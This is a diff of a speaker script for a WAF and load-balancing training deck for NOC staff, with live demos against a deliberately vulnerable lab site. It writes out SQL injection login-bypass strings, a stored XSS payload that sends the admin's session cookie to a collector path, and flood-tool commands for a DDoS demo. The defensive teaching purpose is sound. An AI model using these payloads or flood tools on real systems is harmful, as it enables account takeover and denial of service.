@@ -1,191 +1,311 @@
 # Speaker Script — DP WAF & Load Balancer Training
 
-Plain-language, say-it-like-this script for each slide of `presentation.html`.
-Simple wording on purpose — aim it at someone who has never heard "SQL injection" before.
+Cue-card wording for each slide of `presentation.html` (12-slide deck). Plain language on purpose — aimed at NOC
+staff who have **never** heard of a WAF, load balancing, SQL injection, XSS, or DDoS. That's
+fine; we define every term the first time it appears. Keep it scannable, not a transcript:
+short sentences, say-it-like-this. (We'll also wrap up with a short offline quiz.)
 
-Reminder of the setup: **you drive every attack demo on the projector.** The only thing
-participants do themselves is the capacity test.
+Labels you'll see (so it stays a cue-card, not a wall of text):
+- **ANALOGY:** a quick everyday comparison.
+- **ASK:** a question to put to the audience.
+- **CHECK:** a one-sentence understanding check.
 
----
-
-### Slide 1 — Title
-> "Hey everyone. Today we're talking about two things that protect our websites: a **WAF**,
-> which is like a security guard for our web traffic, and a **Load Balancer**, which stops one
-> server from getting overwhelmed. Instead of just showing slides, I'm going to actually break
-> a website in front of you — for real — and then show you how our WAF would have stopped it.
-> Near the end, you'll get to try one small thing yourselves on your own phone or laptop. Should
-> take about 45 minutes, and stop me anytime with questions."
+Reminder: **you drive every attack demo on the projector.** The only thing participants
+do themselves is the capacity test (Slide 9). Total ~28 min of content for a 45-min session.
 
 ---
 
-### Slide 2 — Agenda
-> "Two halves today. First half: I'll attack a website two ways — stealing a login and stealing
-> someone's session — and show what a WAF can do about each one. Second half: we'll watch a
-> website crash because too many people try to use it at once, and then fix it with load
-> balancing. At the very end there's a few quick questions to check we're all on the same page."
+## Pre-demo setup checklist
+
+Run through this **before** the audience arrives.
+
+- [ ] `npm install` — install dependencies (needed for the flood tooling: `node flood.js`).
+- [ ] Two VPS origins are already provisioned and running the lab app — **no local multi-port
+      juggling** (the old `npm run origin1/2/3 + lb` setup is retired).
+- [ ] DP WAF is configured as the load balancer in front of the 2 VPS origins (IP Hash / sticky).
+- [ ] Verify each VPS responds: `curl` each origin directly.
+- [ ] Confirm the DP WAF dashboard shows **2 healthy upstream origins** and **IP Hash** is selected.
+- [ ] Verify the three demo paths work through the site: login (`guest` / `guest`), the feedback form, and the attacker console.
+- [ ] Confirm the site URL participants will use (the DP WAF-fronted address) — that's the `<site>` for the capacity test.
+- [ ] Have `capacity-simulated.html` open and ready as a fallback for the capacity demo.
+- [ ] Have the flood script ready (your own, or `flood.js` / `flood.html`) for the DDoS demo.
+- [ ] Open the DP WAF subscription dashboard — you'll show live metrics and the **block event** during the DDoS demo.
 
 ---
 
-### Slide 3 — Why this matters to NOC
-> "Here's why I'm telling you this and not just the security team. When something goes wrong
-> with a website, **you're usually the first ones who notice** — a ticket comes in saying 'the
-> site is slow' or 'something looks weird in the logs.' A lot of the time, that 'slow site' is
-> actually just too much traffic hitting one server. And that 'weird traffic' might actually be
-> someone trying to break in. Both of those problems get handled by the same thing: putting a
-> WAF and a load balancer in front of our servers. By the end of today you'll be able to
-> recognize what both of those problems actually look like."
+### Slide 1 — DP WAF & Load Balancer Security & Resilience Training
+⏱ ~1 min
+
+Open warm, keep it short. Welcome everyone — thanks for being here.
+
+Two things protect our websites, and you'll meet both today:
+- **WAF** (Web Application Firewall) — a security guard for our web traffic.
+- **Load balancer** — stops any one server from getting overwhelmed.
+
+This isn't just slides: I'll actually break a website in front of you, then show how our
+WAF would have stopped it. If you've never heard of SQL injection or XSS, you're in the
+right room — we'll define every term as we go. One small hands-on moment for you near the
+end. Should take about 45 minutes — stop me anytime with questions.
+
+**ASK:** "Quick show of hands — who here has been paged for a 'slow site' or seen a weird
+`503`?" (most hands = perfect hook for what's coming)
 
 ---
 
-### Slide 4 — What is a WAF
-> "Simple version: a WAF sits in front of our website and checks every single request before it
-> reaches the actual server — kind of like a bouncer checking IDs at a door. A normal firewall
-> just checks 'is this the right door and is this person even allowed near the building.' A WAF
-> actually reads what's inside the request and asks 'is this person carrying something
-> dangerous.' That's the difference — normal firewalls miss web attacks because they're not
-> looking at that level of detail. A WAF is."
+### Slide 2 — What we'll cover
+⏱ ~1 min
+
+Two parts today.
+- **Part 1 — security:** I'll attack a site two ways — sneaking past a login and stealing
+  someone's session — and show what a WAF does about each.
+- **Part 2 — availability:** we'll watch a site crash because too many people use it at
+  once, then fix it with load balancing.
+
+Each half ends in a live demo — real attacks first, then a real overload and the fix.
+
+**CHECK:** "In one sentence — what are the two problems we're fixing today?"
+(security + availability)
 
 ---
 
-### Slide 5 — The lab
-> "I've already got a practice website running for today — it's built to be **broken on
-> purpose**, so we can attack it safely without touching anything real. For the next 10 minutes
-> or so, just watch my screen — I'll do the attacking. Later, there's one part where you'll open
-> a page yourselves, and I'll give you that link when we get there."
+### Slide 3 — You are the ones who see it first
+⏱ ~2 min
+
+When a site goes wrong, **you're usually the first to notice** — the "site is slow" ticket
+or the weird string in the logs. A lot of those "slow site" tickets are really just too much
+traffic hitting one server; a lot of that "weird traffic" is someone trying to break in.
+
+Both problems get fixed by the same **edge layer** — the stuff that sits in front of our
+servers — a WAF and a load balancer. By the end of today you'll recognize what both look like.
+
+**ANALOGY:** NOC = the night-shift security desk. You watch the cameras; you're first to see
+anything move.
+
+**ASK:** "Who's taken a 3am slow-site page?" — most of those "outages" are really capacity or
+attack, fixed at the edge, not on the server itself.
 
 ---
 
-### Slide 6 — SQL Injection (login bypass)
-> "First attack: stealing a login without knowing the password. Watch this — I'm going to type
-> a weird bit of text into the username box instead of an actual username, leave the password
-> blank, and... I'm in. Logged in as admin, no password needed.
->
-> Here's what happened: this login page builds a question to the database by literally gluing
-> your typed text into it. Normally that question is 'does a user named admin with password
-> secret exist?' But what I typed changes the question itself — I basically told the database
-> 'ignore the rest of this line,' so it stopped checking the password at all. The database isn't
-> broken — it did exactly what it was told. The bug is that the app trusted my typed text as if
-> it were a safe instruction, instead of just data.
->
-> A WAF stops this by recognizing that pattern — that kind of text — and blocking the request
-> before it even reaches our server."
+### Slide 4 — What is a WAF?
+⏱ ~2 min
+
+**WAF** = Web Application Firewall. Simple version: it sits in front of our website and checks
+every single request before it reaches the server — the **origin** (the actual web app living
+behind the WAF).
+
+**ANALOGY:** A WAF is a bouncer at a club door — but one who reads what's *inside* your bag, not
+just checks your ID.
+
+A normal (network) firewall checks "is this the right door, is this person even allowed near
+the building" (IP and port). A WAF actually reads the request content — URL, headers, body — and
+asks "is this carrying something dangerous." That's why a normal firewall misses **SQLi** (SQL
+injection) and **XSS** (cross-site scripting): it's not looking at that level of detail. A WAF is.
+
+**CHECK:** "If the WAF is the bouncer, what's the origin?" (the actual server/app behind it)
+
+---
+
+### Slide 5 — Your training environment
+⏱ ~1 min
+
+I've got a practice website running — **broken on purpose**, so we can attack it safely
+without touching anything real. For the next stretch, just watch my screen; I'll do the
+attacking. Later there's one part where you'll open a page yourselves, and I'll give you that
+link when we get there.
+
+⚠ Vulnerable on purpose — local, authorized training only; never expose it publicly.
+
+**ANALOGY:** Like a fire drill — we set a controlled fire in a training building, never a real one.
+
+---
+
+### Slide 6 — SQL Injection — login bypass
+⏱ ~3 min
+
+First attack: log in with no password.
+
+**SQL** is the language apps use to talk to their database. **SQL injection** = sneaking extra
+instructions into a form answer so the system does more than you were meant to.
+
+**ANALOGY:** A form asks "what's your name?" You answer "John; also, delete everything." If the
+app trusts your text as an instruction instead of just a name, it runs it.
+
+**Demo:**
+1. Log in normally — `guest` / `guest` (works, sets the baseline).
+2. Now username: `' OR 1=1 --` (the click-to-fill chip), password blank → Sign in → **you're admin.**
+3. Point at the `executedSql` panel so they see the real query.
+
+**ASK:** "Before I click — what do you THINK will happen?" (let them guess, then click)
+
+What happened: this login builds its database question by **gluing your typed text straight
+into SQL**. The payload `' OR 1=1 --` makes the query return every row, and `--` comments out
+the password check. The database isn't broken — it did exactly what it was told; the bug is
+the app trusting typed text as an instruction instead of just data. Alt payload: `admin' --`
+skips straight to the admin row. Real fix = **parameterized queries** (treat input as data,
+never code); edge fix = DP WAF.
+
+**If the demo fails:** ensure a trailing space after `--` (it's a SQL comment — needs the
+space); confirm you're hitting the lab origin, not a real site.
+
+**CHECK:** "In one sentence — why did that login work?" (input was treated as code, not data)
 
 ---
 
 ### Slide 7 — Stored XSS → session theft → takeover
-> "This is the big one — pay attention, because this is how small bugs become huge breaches.
->
-> Step one: there's a public feedback form on this site — anyone can submit a message, no login
-> needed. I'm going to submit a message, but instead of writing 'great service,' I'm pasting in
-> a small piece of code.
->
-> Step two: somewhere else, an admin logs in and opens their dashboard to review feedback — just
-> doing their normal job, reading messages. But because this app never checks what's inside a
-> feedback message before showing it, my hidden code actually **runs inside the admin's own
-> browser** the moment they look at it. And that code quietly copies the admin's login cookie
-> and sends it straight to me.
->
-> Step three: I take that stolen cookie, paste it into my own browser, and now — I am the admin.
-> No password. No phishing email. The admin didn't click a suspicious link or do anything wrong
-> — they just read a message, like they do every day. That's what makes this attack so
-> dangerous: it hides inside something completely normal-looking."
+⏱ ~4 min
+
+The big one — pay attention, because this is how small bugs become huge breaches.
+
+**XSS** = cross-site scripting: smuggling a script into a page so it runs in another user's
+browser. **Stored XSS** = the script is saved (here, in a feedback message) and fires later when
+someone views it.
+
+**ANALOGY:** Slipping a hidden note into a comment box that makes the next reader secretly do
+something — like hand over their keys.
+
+A **session cookie** is a temporary ID that says "you're logged in as X." Think handstamp at a
+club — copy someone's stamp and you get in as them.
+
+**Demo (the showpiece):**
+1. Open `/attacker.html` (the cookie collector).
+2. Submit this script on `/feedback.html`:
+   `<script>new Image().src='/api/collect?c='+encodeURIComponent(document.cookie)</script>`
+3. Admin opens the dashboard to review feedback → payload **runs in the admin's browser** and
+   beacons the cookie.
+4. Attacker console → **Replay as admin.** No password, no phishing.
+
+Why it's scary: the admin just *read* a message — normal job — and got taken over. The app
+never checked what was inside a feedback message before showing it. The `dpwaf_session` cookie
+is not **HttpOnly** (a flag that would stop scripts from reading it) on purpose, so the script
+can read it.
+
+**DP WAF blocks both attacks at the edge** — SQLi and XSS — the origin never sees them.
+→ **Part 2:** keeping the site *up*, not just safe.
+
+**If the demo fails:** hard-reload `/dashboard` (the browser may cache the old feedback);
+confirm the `dpwaf_session` cookie is not HttpOnly; restart the server to reset the in-memory
+feedback if needed. If DP WAF blocks the demo in the "behind WAF" phase — **that *is* the
+point**; show the block event in the DP WAF dashboard.
+
+**CHECK:** "The admin never typed a password — so how did the attacker log in?"
+(stole + replayed the cookie)
 
 ---
 
-### Slide 8 — How DP WAF stops both
-> "Two demos, same pattern. The SQL injection and the stored XSS both have weird content inside
-> the request. A weird bit of text in a login box, hidden code inside a message. A WAF reads
-> every request and recognizes 'this looks off' — and blocks it right there, before it ever
-> reaches our actual website.
->
-> To be clear — a WAF isn't magic, and it doesn't replace fixing the code properly. But it's a
-> single checkpoint that catches known bad patterns instantly, for every app behind it, all the
-> time. Now let's talk about the other half — keeping the site *up*, not just safe."
+### Slide 8 — What is load balancing?
+⏱ ~2 min
+
+Different problem now: not an attacker, just too many real users trying to use the site at
+once. A **load balancer** spreads incoming traffic across **multiple identical origins**
+(servers) so no single one is overwhelmed.
+
+**ANALOGY:** Supermarket checkout — one long queue with one open register vs. opening six
+registers and routing each shopper to the next free one. (Or a call center sending each call
+to the next free agent.)
+
+In our real setup, DP WAF **is** the load balancer — it sits in front of **2 VPS origins**
+(already-running copies of the lab app) and routes each client to one of them:
+`Many users → DP WAF (load balancer) → VPS-1, VPS-2`.
+DP WAF load-balances across the 2 VPS origins using **IP Hash** (sticky) — a given client IP
+always lands on the same VPS. (It also supports **Round Robin** — take turns, one each.)
+
+**CHECK:** "A site can be slow for two reasons — which one is load balancing fixing?"
+(too many users / capacity, not an attack)
 
 ---
 
-### Slide 9 — What is load balancing
-> "Different problem now: not an attacker, just too many normal people trying to use the site at
-> the same time. One server can only handle so much — too many people, and it slows down or
-> falls over completely.
->
-> A load balancer is the fix: instead of one server taking all the traffic, you run several
-> identical copies of the server, and something sits in front deciding who goes where — so the
-> load gets spread out evenly. With DP WAF, you don't even need to build that yourself — you just
-> give it the addresses of your servers, and it handles the spreading for you.
->
-> There's a few different ways it can decide who-goes-where — one gives busier servers less
-> traffic, one always sends you to the same server so your session doesn't get confused, that
-> kind of thing. We'll use the 'always the same server' one in a second."
+### Slide 9 — One origin hits the wall
+⏱ ~4 min
+
+**This is the one hands-on moment** — hand out the link now: open `<site>/capacity.html`
+(the DP WAF-fronted site). For this phase, **only ONE VPS origin** is active behind DP WAF.
+That single origin serves only **2 distinct client IPs** at once (a stand-in for real capacity
+limits). The first two of you: green ✅ connected. The third onward: red ❌ **HTTP 503** — a
+real overload, rejected by your *own* IP, not a trick. Single origin = single capacity ceiling.
+
+**HTTP 503** = "service unavailable — I'm too busy right now."
+
+**ANALOGY:** A tiny shop with one clerk and a 2-customer "inside" limit; the third person stands
+in the rain.
+
+Note the **"Served by origin"** field.
+
+**ASK:** "Third person — what did you see?" (the 503)
+
+**If the demo fails:** not enough volunteers or flaky Wi-Fi → fall back to
+`capacity-simulated.html` (simulated User A/B/C). If several people share one office router
+(same public IP), IP Hash sends them all to the same VPS — the per-IP cap blocks the whole
+office. That's exactly the segue to Phase 2 (spread across both VPS).
 
 ---
 
-### Slide 10 — Live capacity test (Phase 1 — participants join in)
-> "Okay, **this next part is where you all get to actually do something.**
->
-> I've set our practice server so it can only handle **2 people at once** — small on purpose so
-> we can see it break quickly. I'm going to give you a link — open it on your own phone or laptop,
-> not this projector.
->
-> [Share the link now: `http://<host>:6060/capacity.html`]
->
-> The first two of you to open it will see a green checkmark — you're connected. Everyone after
-> that will see a red error — the server is full, it rejected you, using your *own* real address,
-> not a trick. That's a genuine overload, happening live, in front of you."
+### Slide 10 — Put DP WAF in front → everyone's back in
+⏱ ~4 min
+
+Bring the **second VPS origin** online (enable both upstreams in the DP WAF dashboard). DP WAF's
+load balancer now spreads participants across **both VPS origins** using IP Hash — same client
+IP → same VPS, sticky. Now **up to 4 IPs** get in (2 per VPS × 2 VPS). Have the person who got
+the 503 reload → they connect, and **"Served by origin"** now differs per person (some land on
+VPS-1, some on VPS-2). That's **horizontal scale** (adding more servers, not one bigger one)
+removing the single-origin wall.
+
+**ANALOGY:** Open a second checkout register — the queue drains instantly.
+
+**CHECK:** "Same shoppers, same moment — why does it work now?" (load spread across 2 VPS origins)
+
+**If the demo fails:** origin unreachable behind the LB → confirm both VPS origins are healthy
+in the DP WAF dashboard (`curl` each one); check that **IP Hash** is the selected algorithm so
+sticky routing works.
 
 ---
 
-### Slide 11 — Phase 2 — DP WAF fixes it
-> "Now watch what happens when I turn on load balancing. I'm starting up two more copies of the
-> exact same server, and putting a load balancer in front of all three.
->
-> Everyone who got rejected — refresh that same page now.
->
-> ...There you go — you're all in now. And if you look closely, you'll notice the page tells you
-> *which* server answered you — some of you landed on server 1, some on server 2, some on server
-> 3. That's the load balancer spreading everyone out so no single server gets overwhelmed. In
-> real life, we wouldn't build our own balancer like I just did for this test — we'd just hand
-> DP WAF our server addresses and it does exactly this automatically."
+### Slide 11 — DDoS protection — per-IP awareness
+⏱ ~2 min
+
+Close cousin of the capacity wall: instead of many real users, one attacker floods the service
+from many fake connections — a **DDoS** (Distributed Denial of Service).
+
+**ANALOGY:** A crowd all rushing the entrance at once so no legitimate visitor can get in.
+
+DP WAF runs a log analyzer watching for flood patterns per IP; abusive IPs go on a block list
+and FortiGate drops their traffic before the origin. LB spreads the *good* traffic; per-IP
+blocking removes the *bad* — same IP-awareness you saw in the capacity demo, applied defensively.
+
+**Demo (real, against DP WAF):**
+1. You run the flood script from your own machine/IP — many rapid requests at the site.
+2. DP WAF's DDoS protection detects the abnormal volume from **your real IP** and **blocks it**.
+3. You then open the site in your browser → **you can no longer reach it.** DP WAF blocked your
+   real client IP — that's the proof.
+
+**Why the block is genuine:** against the real DP WAF, the fake `X-Forwarded-For` header does
+nothing (DP WAF ignores untrusted client headers and sees your real source IP). So the block is
+on your real IP — not a simulation.
+
+**Flood tooling for the demo:**
+- `flood.html` — browser-based, visual live log (target URL, concurrency, fake-IP count).
+- `node flood.js <url> [concurrency] [total-requests]` — CLI, higher concurrency.
+
+**Contingency:** unblock your IP afterward via the DP WAF dashboard — or run this demo **last**
+so the block doesn't interrupt the rest of the session.
+
+**CHECK:** "LB spreads the good traffic — what handles the bad?" (per-IP block list + FortiGate)
 
 ---
 
-### Slide 12 — DDoS protection
-> "One more scenario, close cousin of what we just saw: instead of a lot of *real* users showing
-> up at once, imagine one attacker using thousands of fake connections trying to flood and crash
-> the server on purpose — that's called a DDoS attack.
->
-> DP WAF is constantly watching traffic patterns for exactly this — if one address is sending
-> a suspicious flood of requests, it gets flagged and blocked automatically, before it ever
-> reaches our servers. So you get two layers of protection working together: load balancing
-> spreads out the *real* traffic, and this per-address blocking gets rid of the *fake* traffic."
+### Slide 12 — Takeaways for NOC
+⏱ ~2 min
 
----
+Four points, plain and simple:
+- 🛡️ **WAF = layer-7 guard.** Blocks SQLi & XSS — what the network firewall can't see.
+- ⚖️ **Load balancing = availability.** Horizontal scale removes the single-origin wall.
+- 🚧 **Per-IP control = DDoS defense.** Spread the good, drop the bad, at the edge.
+- 👀 **You're the first responders.** Now you know the signatures: 503 spikes, single-IP
+  floods, injection strings in the logs.
 
-### Slide 13 — Takeaways
-> "So here's everything in four points, plain and simple:
-> - A WAF reads every request in detail and blocks SQLi and XSS before they reach our server.
-> - Load balancing spreads traffic across multiple servers so one overloaded server doesn't take
->   the whole site down.
-> - Per-IP blocking stops intentional flood attacks (DDoS).
-> - And you all, in NOC, are usually the first to see the warning signs — now you know what
->   those warning signs actually look like from the inside."
+One-liner: the edge (WAF + LB) enforces both security *and* availability before the origin.
+Encourage them to replay the lab afterward.
 
----
+**ASK:** "Which of these four will you watch for on your next shift?" (one volunteer each)
 
-### Slide 14 — Quiz / Q&A
-> "Quick check before we wrap up — few questions, feel free to just shout out answers:
-> 1. Why did a normal firewall miss that login trick, but a WAF would catch it?
->    *(Because a normal firewall doesn't read what's inside the request — a WAF does.)*
-> 2. The admin never clicked anything weird — so how did their login get stolen?
->    *(Hidden code inside a feedback message ran in their browser the moment they viewed it.)*
-> 3. If a bunch of people share one office internet connection, they'll look like one address to
->    our server — why does that matter for the load balancer?
->    *(We want the 'same address, same server' rule so their sessions don't get mixed up, and the
->    per-address limit doesn't unfairly block a whole office.)*
-> 4. If you suddenly saw a wave of errors and one IP address making almost all the requests,
->    what would you guess is happening?
->    *(Likely a flood/DDoS attempt from that address — worth blocking and confirming servers are
->    still healthy.)*
->
-> That's it — thanks everyone, and I'll leave the practice site running if anyone wants to poke
-> around after."
+Thanks everyone — point to the README for self-study; the practice site stays up if anyone wants
+to poke around after.
